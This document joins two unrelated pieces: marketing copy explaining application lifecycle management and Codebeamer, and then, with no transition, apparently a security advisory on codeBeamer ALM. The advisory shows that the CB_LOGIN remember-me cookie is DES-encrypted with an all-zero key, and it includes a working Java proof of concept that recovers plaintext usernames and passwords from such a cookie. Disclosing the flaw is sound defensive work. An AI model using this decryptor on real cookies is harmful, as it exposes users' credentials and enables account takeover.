## What is application lifecycle management (ALM)?

Application Lifecycle Management (ALM) is the strategic process of managing a software or product lifecycle from initial idea through design, development, testing, deployment, and end of life. ALM enables software engineering teams to efficiently collaborate on projects using proven Agile practices and trusted, up-to-date information. It is a foundational discipline for successful products, teams, and companies.

## Why is ALM important?

Application lifecycle management helps teams manage the inherent complexity of modern software development. Today, product value is increasingly delivered through software. For example, the average automobile is composed of microprocessors running over 100 million lines of code. ALM connects people, processes, and tools to align teams around common goals, speed software delivery, and simplify regulatory compliance.

## Key areas of ALM

### Governance

Establish a transparent, well-documented governance framework for software development. ALM enables organizations to establish transparent processes for decision-making and improve oversight and accountability of projects and software systems.

### Application Development

Navigate the inherent complexity of modern, Agile software development. Today's software engineers are vastly more productive than their predecessors of even a few years ago. This remarkable efficiency is delivered in the context of added complexity. By providing a single source of truth and end-to-end traceability for software development, covering requirements management, test management and project management, ALM makes modern software development possible.

### Maintenance

It's estimated that maintenance consumes 40-70% of the costs of the software lifecycle. Ongoing software maintenance is necessary to fix errors, maintain competitive parity, and respond to evolving customer needs. Application lifecycle management enables teams to efficiently track and manage changes and scheduled product releases over the lifetime of the product, enabling organizations to fulfill the promise of their product long after initial deployment.

## Six stages of application lifecycle management (ALM)

ALM stages vary from organization to organization, but typically include the following:

### Requirements Definition

Stakeholders analyze the problem and define the high-level scope of the solution. Over many iterations, requirements are refined and detailed.

### Design

Software architects and design engineers iteratively define the structure of the solution, identifying solution components, behavior, and relationships.

### Software Development

Software engineering teams composed of analysts, designers, developers, testers, and leaders work collaboratively to develop successive versions of the software.

### Testing and Quality Assurance

Everyone is responsible for quality. QA and risk management are part of every iteration, using tests that ensure the delivered software meets the original needs.

### Deployment

This phase covers the tasks of preparing, installing, and operationalizing software deliveries.

### Maintenance

Once released, support teams capture enhancements requests and defects. New releases provide an opportunity to fix errors and make software updates.

## Frequently asked questions

### What is ALM used for?

Application Lifecycle Management (ALM) is a discipline that is applicable to any software product or project that requires the orchestration of people, tools, and processes. ALM supports the development of software, components, or libraries, and much more.

### How does ALM support regulated industries?

Regulated industries, including aerospace and defense, [medical and pharmaceutical](/en/technologies/application-lifecycle-management/medical-device-development), and [transportation and automotive](/en/technologies/application-lifecycle-management/automotive-embedded-software), impose specialized requirements for building safety-critical products. These requirements govern both the safety and quality of the end products, as well as the rigor and auditability of the software development process itself. Because it provides a comprehensive governance framework, ALM excels at supporting software development in regulated industries. Specialized ALM capabilities can support IEC 82304-1, IEC 62304, [ISO 14971](/en/blogs/alm/iso-14971-and-medical-device-risk-management), FDA 21 CFR Parts 11 & 820, [ISO 26262](/en/resources/application-lifecycle-management/report/top-iso-26262-blunders), [ISO 13485](/en/resources/application-lifecycle-management/report/essential-iso-13485-qms-medical-devices), Automotive SPICE, CMMI, and other standards and regulations.

### What is the difference between ALM and PLM software?

ALM and PLM software work together to enable digital transformation. ALM excels at managing software requirements, test assets, and software releases throughout the software lifecycle. PLM excels at managing products, design documents, product platforms, and variants. [Together, ALM and PLM](/en/resources/application-lifecycle-management/ebook/top-five-use-cases-of-alm-plm-integration) empower organizations to manage their complete product portfolio.

### What software development processes does ALM support?

Application Lifecycle Management as a discipline is process-agnostic and can be used to implement any software development process. Specific ALM tools, however, may limit your choice of process. That's why it's important to select an ALM platform that supports and helps automate your preferred way of working, whether it's Scrum, SAFe, V-Model, or another Agile or hybrid process.

### What is the difference between SDLC and ALM?

Application Lifecycle Management (ALM) is the governance of software development throughout its lifecycle, whereas software development lifecycle (SDLC) is more precisely the initial development phase of the software itself, or the process used to define and execute a software build and implementation. While SDLC focuses on the technical aspects of development, ALM covers all activities from planning to retirement. SDLC is under the larger ALM canopy.

### What is the difference between ALM and DevOps?

ALM encompasses the entire lifecycle from inception through retirement, including requirements management, design, development, testing, deployment, and maintenance, to provide a centralized platform for managing these processes and enable collaboration among different teams and stakeholders.
DevOps is a software delivery approach to eliminate barriers between existing development and operations teams that evolved from agile practices requiring more harmony between development and operations teams. DevOps practices emphasize continuous integration and delivery, automation of infrastructure, and monitoring with the goal of increasing software delivery speed, reliability, and quality.

### Is ALM only for waterfall teams?

While ALM methodologies were originally developed to support traditional waterfall development processes, they are adaptable to various development methodologies, including agile, iterative, and hybrid approaches. Codebeamer is custom-built to help teams go agile. Teams that prefer waterfall can continue to use that methodology, or if they seek to mix both methodologies on their road to agile adoption, they can leverage the [agile-waterfall hybrid features](/en/blogs/alm/sdlc-risk-management-in-agile-and-waterfall-environments) in Codebeamer. ALM’s primary goal is to provide a centralized platform for managing the entire lifecycle of an application, regardless of the specific development methodology being used.

Introduction:
-------------
codeBeamer Application Lifecycle Management (ALM) provides Project-, Task-,
Requirement-, Test- Change-, Configuration-, Build-, Knowledge- and Document
management in a single, secure environment. It enables software and hardware
development to be more collaborative, transparent and productive. [2]
The remember-me cookie (CB\_LOGIN) issued by the application contains the
encrypted user's credentials. However, due to a bug in the application code,
those credentials are encrypted using a NULL encryption key.
Affected:
---------
Vulnerable:
10.0.0-final
21.04-final
No other version was tested, but it is believed for the older versions to be
vulnerable as well.
Technical Description
---------------------
When the application issues a remember-me cookie (CB\_LOGIN), it encrypts the
username and the password and puts the result in the cookie. However, the
encryption process is flawed:
\* The encryption key should be derived from the server's MAC address but,
because of a bug in the code, the key is always NULL
\* An empty salt is specified.
Due to these flaws, the result of the encryption is static and predictable
(across all installation instances of the software).
The following Proof of Concept JAVA code can be used to decrypt a CB\_LOGIN
cookie value to retrieve plaintext user's credentials. The token variable
contains the CB\_LOGIN token:
```
public class decryptCookies {
public static void main(String[] args) throws Exception {
String token = "D4-2C-{CUT-BY-COMPASS}-DA-2D";
byte[] keyPadded = new byte[8];
Arrays.fill(keyPadded, (byte)0);
Key encKey = SecretKeyFactory.getInstance("DES").generateSecret(
new DESKeySpec(keyPadded));
Cipher desCipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
desCipher.init(2, encKey);
System.out.println(" --> " + new String(desCipher
.doFinal(stringToByteArray(token)), "UTF-8"));
}
private static byte[] stringToByteArray(String str) {
if (str == null)
str = "";
ByteArrayOutputStream bos = new ByteArrayOutputStream();
for (StringTokenizer st = new StringTokenizer(str, "-", false);
st.hasMoreTokens();) {
try {
int i = Integer.parseInt(st.nextToken(), 16);
bos.write((byte)i);
} catch (NumberFormatException numberFormatException) {
System.out.println("Error: could not parse token (" +
numberFormatException.getMessage() + ")");
}
}
return bos.toByteArray();
}
}
```
This vulnerability resides in the application code used to generate and issue the
CB\_LOGIN cookie. This cookie is generated in the class com.intland.codebeamer.utils.CookieUtils.
The value of the cookie is provided by the method SavedUserCredentials.getToken(),
which is called with the username, the user's password and an empty salt as parameter:
```
public static void storeUserCredentialsCookie(HttpServletRequest request,
HttpServletResponse response, String userName, String password) {
String userName2 = StringUtils.trimToNull(userName);
Cookie cookie = new Cookie(CB\_LOGIN,
SavedUserCredentials.getToken(userName2, password, (String) null));
```
The method com.intland.codebeamer.security.SavedUserCredentials.getToken()
concatenates and encrypts the username and password. The encryption key is generated
by the method getCryptingKey() where the NULL salt is passed:
```
public static String getToken(String userName2, String password2, String salt) {
return encrypt(
StringUtils.defaultString(StringUtils.trimToNull(userName2)) +
USER\_PASSWORD\_SEPARATOR + StringUtils.defaultString(password2),
StringUtils.trimToEmpty(salt));
}
[CUT-BY-COMPASS]
public static String encrypt(String value, String salt) {
return crypter.encrypt(value, getCryptingKey(salt));
}
```
The method getCryptingKey() returns an encryption key based on the system's MAC address.
As the configured salt is always NULL, it will directly return the result of
getCryptingKeyFromMacAddress():
```
private static String getCryptingKey(String salt) {
if (StringUtils.isEmpty(salt)) {
return getCryptingKeyFromMacAddress();
}
String salt2 = StringUtils.trimToEmpty(salt);
StringBuilder key = new StringBuilder(getCryptingKeyFromMacAddress());
String hex = Long.toHexString((long) salt2.hashCode());
for (int i = hex.length() - 1; i > 0; i--) {
char c = hex.charAt(i);
if (c != '-') {
key.append("-").append(c);
}
}
return key.toString();
}
```
The method getCryptingKeyFromMacAddress() returns the system's MAC address
in the format XX:XX:XX:XX:XX:XX.
The string to be encrypted and the MAC address are then fed to the
encrypt() method of the class com.intland.codebeamer.manager.support.Crypter
where the system's MAC address is converted into an encryption key by calling
the method keyStringToKey():
```
public String encrypt(String source, String keyString) {
try {
Key key = keyStringToKey(keyString);
Cipher desCipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
desCipher.init(1, key);
if (source == null) {
source = "";
}
return byteArrayToString(desCipher.doFinal(source.getBytes("UTF-8")));
} catch (Throwable ex) {
logger.error(ex.toString(), ex);
return null;
}
}
```
The method keyStringToKey() feeds the keyString into the stringToByteArray() method:
```
private static Key keyStringToKey(String keyString) throws InvalidKeyException,
NoSuchAlgorithmException, InvalidKeySpecException {
if (StringUtils.isBlank(keyString)) {
throw new IllegalArgumentException("Key cannot be blank: " + keyString);
}
byte[] bytes = stringToByteArray(keyString);
if (!(bytes == null || bytes.length == 8)) {
byte[] padded = new byte[8];
for (int i = 0; i < 8; i++) {
if (i < bytes.length) {
padded[i] = bytes[i];
} else {
padded[i] = 0;
}
}
bytes = padded;
}
return SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(bytes));
}
```
The method stringToByteArray() splits the provided keyString (MAC address) into hexadecimal
tokens, and converts each token to an integer. However, the tokens are split with the
delimiter -. As the MAC address has the format XX:XX:XX:XX:XX:XX and is delimited with :,
the conversion will fail and a NumberFormatException is thrown. However, nothing happens
when such an exception occurs and an empty array is returned.:
```
private static byte[] stringToByteArray(String str) {
if (str == null) {
str = "";
}
ByteArrayOutputStream bos = new ByteArrayOutputStream();
StringTokenizer st = new StringTokenizer(str, "-", false);
while (st.hasMoreTokens()) {
try {
bos.write((byte) Integer.parseInt(st.nextToken(), 16));
} catch (NumberFormatException e) {
}
}
return bos.toByteArray();
}
```
As a result, an empty byte array is used as base for the encryption key.
This means that the encryption key is always the same (for all installations of the software)
and everyone with access to the above source code is able to decrypt all remember-me cookies
of the codeBeamer application.
Workaround / Fix:
-----------------
The "Remember Me" feature should be re-designed to use a randomly-generated session ID instead
of encrypted user information and the ID should be bound to the user agent and/or IP address of
the user. Furthermore, the ID should only be valid for a limited amount of time and be re-generated
after being used once.
